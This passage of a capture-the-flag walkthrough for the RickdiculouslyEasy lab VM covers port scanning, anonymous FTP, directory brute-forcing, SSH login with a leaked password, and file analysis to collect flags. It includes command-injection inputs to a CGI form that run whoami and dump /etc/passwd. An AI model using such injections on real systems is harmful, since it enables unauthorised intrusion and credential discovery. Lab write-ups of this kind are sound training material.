|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.4.0-31-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.27 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Morty&lt;span class=&quot;s1&quot;&gt;'s Website
9090/tcp  open  http    Cockpit web service
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://10.0.2.15:9090/
13337/tcp open  unknown
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (EdDSA)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings:
|   NULL, ibm-db2:
|_    Welcome to Ricks half baked reverse shell...
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,&quot;Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,&quot;FLAG:{TheyFoundMyBackDoorMorty}-10Points\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.60%I=7%D=11/1%Time=59F998FB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20&quot;)%r(ibm-db2,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20&quot;);
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 35.438 days (since Tue Sep 26 19:20:25 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 10.0.2.15

NSE: Script Post-scanning.
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1615.79 seconds
           Raw packets sent: 128763 (5.668MB) | Rcvd: 128754 (5.153MB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And together with the results of this comprehensive scan, we get the first flag!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG:{TheyFoundMyBackDoorMorty}-10Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s take a look at all the services more closely. Firstly, we can check &lt;strong&gt;ftp&lt;/strong&gt; using anonymous login.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ftp 10.0.2.15
Connected to 10.0.2.15.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.15:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              33 Aug 22 05:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp&amp;gt; get FLAG.txt
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: FLAG.txt remote: FLAG.txt
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;FLAG.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
42 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;21.4967 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;pub
250 Directory successfully changed.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Feb 12  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;221 Goodbye.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That was easy, another flag is in our hands.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Whoa this is unexpected} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next part would be &lt;strong&gt;ssh&lt;/strong&gt; service running on port &lt;strong&gt;21&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh 10.0.2.15
ssh_exchange_identification: Connection closed by remote host&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But unfortunately it’s not working so we can move to another port. Before scanning the website I decided to look at port &lt;strong&gt;9090&lt;/strong&gt; which is &lt;strong&gt;cockpit web service&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;https://10.0.2.15:9090/
FLAG {There is no Zeus, in your face!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Third flag! That’s 30 points already gathered. Now we can move on to the website scanning.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, as usuall, let’s brute force this website using &lt;strong&gt;dirbuster&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://10.0.2.15/

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Wed Nov  1 04:49:28 2017
URL_BASE: http://10.0.2.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612                                                          

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.0.2.15/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://10.0.2.15/cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:217&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
+ http://10.0.2.15/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:326&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.15/passwords/                                     
+ http://10.0.2.15/robots.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:126&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Entering directory: http://10.0.2.15/passwords/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(!)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Use mode &lt;span class=&quot;s1&quot;&gt;'-w'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you want to scan it anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Wed Nov  1 04:49:31 2017
DOWNLOADED: 4612 - FOUND: 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A few good hits, both looking very promising. I wonder what’s hidden inside &lt;strong&gt;passwords&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/passwords.png&quot; alt=&quot;Passwords&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another flag!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Yeah d- just don't do it.} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And what is much better, we have a password hidden in the comment of &lt;strong&gt;passwords.html&lt;/strong&gt; file. Let’s keep it in mind.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Morty's Website&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--Password: winter--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another result of this scan was &lt;strong&gt;robots.txt&lt;/strong&gt; file, which we can check now.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Root shell console?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://10.0.2.15/cgi-bin/root_shell.cgi
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Root Shell
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
--UNDER CONSTRUCTION--
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--I'm sorry Morty. It's a bummer.--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s bad, it would have been so much easier. Now let’s check the &lt;strong&gt;tracertool&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.15/cgi-bin/tracertool.cgi
&quot;;whoami;
apache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s a form that is vulnerable to &lt;strong&gt;command injection&lt;/strong&gt;. But as you can see, someone replaced the &lt;strong&gt;cat&lt;/strong&gt; command with the ASCII art of actuall cat.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;cat tracertool.cgi
                      _
                     | \
                     | |
                     | |
 |\                   | |
/, ~\                / /
X     `-.....-------./ /
~-. ~  ~              |
    \             /    |
    \  /_     ___\   /
    | /\ ~~~~~   \  |
    | | \        || |
    | |\ \       || )
    (_/ (_/      ((_/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Fortunately there are more commands allowing us to view text such as &lt;strong&gt;more&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;more /etc/passwd;
::::::::::::::
/etc/passwd
::::::::::::::
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I know that we have a password to one of these accounts, but to which one? Let’s check it using the &lt;strong&gt;ssh&lt;/strong&gt; port 22222.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 Summer@10.0.2.15
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Last failed login: Wed Nov  1 21:17:04 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ whoami
Summer&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s working! Now we can take a look around the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[Summer@localhost ~]$ ls -la
total 20
drwx------. 2 Summer Summer  99 Sep 15 11:49 .
drwxr-xr-x. 5 root   root    52 Aug 18 18:20 ..
-rw-------. 1 Summer Summer   1 Sep 15 11:51 .bash_history
-rw-r--r--. 1 Summer Summer  18 May 30 14:53 .bash_logout
-rw-r--r--. 1 Summer Summer 193 May 30 14:53 .bash_profile
-rw-r--r--. 1 Summer Summer 231 May 30 14:53 .bashrc
-rw-rw-r--. 1 Summer Summer  48 Aug 22 02:46 FLAG.txt
[Summer@localhost ~]$ more FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag, and that’s &lt;strong&gt;50pts&lt;/strong&gt; already. Almost half way through.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 0
drwxr-xr-x.  5 root        root         52 Aug 18 18:20 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x. 17 root        root        236 Aug 18 19:16 ..
drwxr-xr-x.  2 Morty       Morty       131 Sep 15 11:49 Morty
drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21 10:30 RickSanchez
drwx------.  2 Summer      Summer       99 Sep 15 11:49 Summer
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; Morty
total 64
drwxr-xr-x. 2 Morty Morty   131 Sep 15 11:49 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root  root     52 Aug 18 18:20 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty     1 Sep 15 11:51 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty    18 May 30 14:53 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   193 May 30 14:53 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   231 May 30 14:53 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root  43145 Aug 22 03:04 Safe_Password.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root    414 Aug 22 03:06 journal.txt.zip

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; RickSanchez
total 12
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root        root         52 Aug 18 18:20 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  18 May 30 14:53 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 193 May 30 14:53 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 231 May 30 14:53 .bashrc
drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21 09:50 RICKS_SAFE
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 ThisDoesntContainAnyFlags&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s what we want to investigate now, contents of both Rick and Morty home directories. Let’s start with &lt;strong&gt;Morty&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/Morty/Safe_Password.jpg ~
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Safe_Password.jpg                             100%   42KB  10.8MB/s   00:00
root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/Morty/journal.txt.zip ~
Summer@10.0.2.15'&lt;/span&gt;s password:
journal.txt.zip                               100%  414   241.4KB/s   00:00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After copying files using &lt;strong&gt;scp&lt;/strong&gt;, we can safely investigate them on our machine. Unfortuntely zip file is password protected.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;journal.txt.zip] journal.txt password:
password incorrect--reenter:
password incorrect--reenter:
   skipping: journal.txt             incorrect password
   root@kali:~# strings Safe_Password.jpg
   JFIF
   Exif
   8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
   8BIM
   8BIM
   &lt;span class=&quot;nv&quot;&gt;$3br&lt;/span&gt;
   %&amp;amp;&lt;span class=&quot;s1&quot;&gt;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   	#3R
   &amp;amp;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   0D000D&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;DDD&lt;span class=&quot;se&quot;&gt;\t\\\\\t&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Which was revealed by using &lt;strong&gt;string&lt;/strong&gt; command. Now we can unzip it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password:
  inflating: journal.txt             
root@kali:~# cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag that brings us to &lt;strong&gt;70pts&lt;/strong&gt;. And a password to the safe!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/RickSanchez/RICKS_SAFE/safe ~
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
safe                                          100% 8704     2.8MB/s   00:00
root@kali:~# binwalk safe

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This file was indentified by &lt;strong&gt;binwalk&lt;/strong&gt; as an executable. Let’s run it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
./safe: error &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But firstly, we have to install mcrypt library.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to go and run the program with proper argument.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe 131333
decrypt: 	FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;And Awwwaaaaayyyy we Go!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 20 Points

Ricks password hints:
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;This is incase I forget.. I just hope I don&lt;span class=&quot;s1&quot;&gt;'t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag, summing up to &lt;strong&gt;90pts&lt;/strong&gt;, together with a clue to the Rick’s password.&lt;/p&gt;

